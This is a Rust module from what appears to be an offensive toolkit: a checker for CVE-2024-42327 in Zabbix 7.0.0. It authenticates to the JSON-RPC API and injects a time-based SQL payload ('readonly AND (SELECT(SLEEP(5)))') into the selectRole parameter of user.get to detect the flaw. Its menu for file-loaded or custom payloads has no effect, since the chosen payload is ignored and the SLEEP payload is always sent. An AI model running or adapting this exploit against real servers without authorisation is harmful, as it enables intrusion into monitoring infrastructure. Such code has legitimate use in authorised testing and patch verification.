use anyhow::{anyhow, Result};
use colored::*;
use reqwest::Client;
use serde_json::json;
use std::fs;
use std::io::{self, Write};
use std::time::Duration;

const HEADERS: &str = "application/json";
const DEFAULT_TIMEOUT_SECS: u64 = 30;

/// Display module banner
fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   Zabbix 7.0.0 SQL Injection Checker                      ║".cyan());
    println!("{}", "║   CVE-2024-42327 - Time-based SQL Injection               ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
}

// Internal function renamed to `exploit_zabbix` to avoid conflicts
async fn exploit_zabbix(api_url: &str, username: &str, password: &str, _payload: &str) -> Result<()> {
    let client = Client::builder()
        .timeout(Duration::from_secs(DEFAULT_TIMEOUT_SECS))
        .danger_accept_invalid_certs(true)
        .build()
        .map_err(|e| anyhow!("Failed to build HTTP client: {}", e))?;

    let url = format!("{}/api_jsonrpc.php", api_url.trim_end_matches('/'));

    // Login to get the token
    println!("{}", "[*] Attempting to authenticate...".cyan());
    let login_data = json!({
        "jsonrpc": "2.0",
        "method": "user.login",
        "params": {
            "username": username,
            "password": password
        },
        "id": 1,
        "auth": null
    });

    let login_response = client
        .post(&url)
        .header("Content-Type", HEADERS)
        .json(&login_data)
        .send()
        .await
        .map_err(|e| anyhow!("Login request error: {}", e))?;

    let login_response_json: serde_json::Value = login_response
        .json()
        .await
        .map_err(|e| anyhow!("Failed to parse login response: {}", e))?;

    let auth_token = login_response_json
        .get("result")
        .ok_or_else(|| anyhow!("Failed to retrieve auth token - check credentials"))?
        .as_str()
        .ok_or_else(|| anyhow!("Auth token not a string"))?
        .to_string();

    println!("{}", "[+] Authentication successful".green());

    // SQLi test using the provided payload
    println!("{}", "[*] Testing for SQL injection vulnerability...".yellow());
    let sqli_data = json!({
        "jsonrpc": "2.0",
        "method": "user.get",
        "params": {
            "selectRole": ["roleid", "name", "type", "readonly AND (SELECT(SLEEP(5)))"],
            "userids": ["1", "2"]
        },
        "id": 1,
        "auth": auth_token
    });

    let start = std::time::Instant::now();
    let test_response = client
        .post(&url)
        .header("Content-Type", HEADERS)
        .json(&sqli_data)
        .send()
        .await
        .map_err(|e| anyhow!("Test request error: {}", e))?;

    let elapsed = start.elapsed();
    let test_response_text = test_response
        .text()
        .await
        .map_err(|e| anyhow!("Failed to read test response: {}", e))?;

    println!("{}", format!("[*] Response received in {:.2}s", elapsed.as_secs_f64()).cyan());

    if test_response_text.contains("\"error\"") {
        println!("{}", "[-] Target does NOT appear vulnerable (error in response).".red());
    } else if elapsed.as_secs() >= 5 {
        println!("{}", "[+] VULNERABLE! Response delayed by SLEEP injection.".green().bold());
    } else {
        println!("{}", "[?] Inconclusive - response received but no delay detected.".yellow());
    }

    Ok(())
}

// Prompt user to choose a payload option
async fn get_payload_choice() -> Result<String> {
    println!("{}", "[*] Choose SQL payload option:".cyan().bold());
    println!("  {} Load SQL payloads from file", "[1]".green());
    println!("  {} Enter custom SQL payload", "[2]".green());
    println!("  {} Use default SQL payload (SLEEP-based)", "[3]".green());

    let mut choice = String::new();
    print!("{}", "Enter your choice (1/2/3): ".cyan().bold());
    io::stdout().flush().unwrap();
    io::stdin()
        .read_line(&mut choice)
        .map_err(|e| anyhow!("Failed to read choice: {}", e))?;

    let choice = choice.trim();

    match choice {
        "1" => {
            // Load from a file (e.g., sql_payloads.txt)
            println!("{}", "[*] Loading SQL payloads from file...".cyan());
            let payloads = fs::read_to_string("sql_payloads.txt")
                .map_err(|e| anyhow!("Error reading payload file: {}", e))?;
            println!("{}", "[+] Payloads loaded successfully".green());
            Ok(payloads.trim().to_string())
        }
        "2" => {
            // Allow user to input a custom payload
            print!("{}", "Enter your custom SQL payload: ".cyan().bold());
            io::stdout().flush().unwrap();
            let mut custom_payload = String::new();
            io::stdin()
                .read_line(&mut custom_payload)
                .map_err(|e| anyhow!("Failed to read custom payload: {}", e))?;

            let custom_payload = custom_payload.trim();

            // Ensure the custom payload isn't empty
            if custom_payload.is_empty() {
                println!("{}", "[-] Custom payload cannot be empty".red());
                return Err(anyhow!("Custom payload cannot be empty. Please enter a valid payload."));
            }

            println!("{}", format!("[+] Using custom payload: {}", custom_payload).green());
            Ok(custom_payload.to_string())
        }
        "3" => {
            // Use a default payload
            println!("{}", "[*] Using default SQL payload (SLEEP-based)...".cyan());
            Ok("readonly AND (SELECT(SLEEP(5)))".to_string())
        }
        _ => {
            println!("{}", "[-] Invalid choice".red());
            Err(anyhow!("Invalid choice, please select 1, 2, or 3."))
        }
    }
}

// Public dispatch entry point
pub async fn run(target: &str) -> Result<()> {
    display_banner();
    println!("{}", format!("[*] Target API URL: {}", target).yellow());
    println!();

    let mut username = String::new();
    let mut password = String::new();

    print!("{}", "Username: ".cyan().bold());
    io::stdout().flush().unwrap();
    io::stdin()
        .read_line(&mut username)
        .map_err(|e| anyhow!("Failed to read username: {}", e))?;

    print!("{}", "Password: ".cyan().bold());
    io::stdout().flush().unwrap();
    io::stdin()
        .read_line(&mut password)
        .map_err(|e| anyhow!("Failed to read password: {}", e))?;

    let username = username.trim();
    let password = password.trim();

    if username.is_empty() || password.is_empty() {
        println!("{}", "[-] Username and password are required".red());
        return Err(anyhow!("Username and password are required"));
    }

    // Get the payload choice from the user
    let payload = get_payload_choice().await?;

    // Run the exploit with the selected payload
    exploit_zabbix(target, username, password, &payload).await
}
